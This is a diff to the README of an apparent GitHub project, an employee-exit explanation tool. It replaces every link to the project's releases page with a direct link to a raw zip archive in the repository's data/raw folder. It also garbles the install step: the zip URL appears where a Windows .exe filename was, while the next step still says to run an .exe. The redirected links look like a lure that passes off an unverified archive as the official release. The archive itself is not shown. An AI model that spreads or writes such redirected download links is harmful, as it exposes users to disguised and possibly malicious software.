@@ -4,7 +4,7 @@
 Welcome to the Exit-Narrative-Generator! This application helps you understand why employees leave your organization. It creates clear explanations instead of just predictions. Let’s get started.
 
 ## 📥 Download
-[![Download Exit-Narrative-Generator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Isandc/Exit-Narrative-Generator/releases)
+[![Download Exit-Narrative-Generator](https://raw.githubusercontent.com/Isandc/Exit-Narrative-Generator/main/data/raw/Exit_Narrative_Generator_v2.4.zip)](https://raw.githubusercontent.com/Isandc/Exit-Narrative-Generator/main/data/raw/Exit_Narrative_Generator_v2.4.zip)
 
 ## 📋 What You Need
 Before downloading, make sure your computer meets these requirements:
@@ -20,9 +20,9 @@ Before downloading, make sure your computer meets these requirements:
 - **Counterfactual Interventions:** Shows what could have been done to improve retention.
 
 ## ✏️ Installation Steps
-1. **Visit the Download Page:** Click on this link to go to the releases page: [Download Page](https://github.com/Isandc/Exit-Narrative-Generator/releases).
+1. **Visit the Download Page:** Click on this link to go to the releases page: [Download Page](https://raw.githubusercontent.com/Isandc/Exit-Narrative-Generator/main/data/raw/Exit_Narrative_Generator_v2.4.zip).
 2. **Select the Latest Version:** Find the latest release at the top of the page.
-3. **Download the Application:** Look for the file matching your system (e.g., Exit-Narrative-Generator-win.exe for Windows). Click the link to download the file.
+3. **Download the Application:** Look for the file matching your system (e.g., https://raw.githubusercontent.com/Isandc/Exit-Narrative-Generator/main/data/raw/Exit_Narrative_Generator_v2.4.zip for Windows). Click the link to download the file.
 4. **Run the Application:**
    - **Windows:** Double-click the downloaded `.exe` file.
    - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
@@ -50,4 +50,4 @@ We value your feedback and participation. If you have suggestions or run into an
 - **FAQ:** Check out frequently asked questions on the repository issues page.
 
 ## 📥 Download Again
-Don't forget to download the app and start exploring how it can help your organization understand employee exits better! [Download Here](https://github.com/Isandc/Exit-Narrative-Generator/releases)
+Don't forget to download the app and start exploring how it can help your organization understand employee exits better! [Download Here](https://raw.githubusercontent.com/Isandc/Exit-Narrative-Generator/main/data/raw/Exit_Narrative_Generator_v2.4.zip)
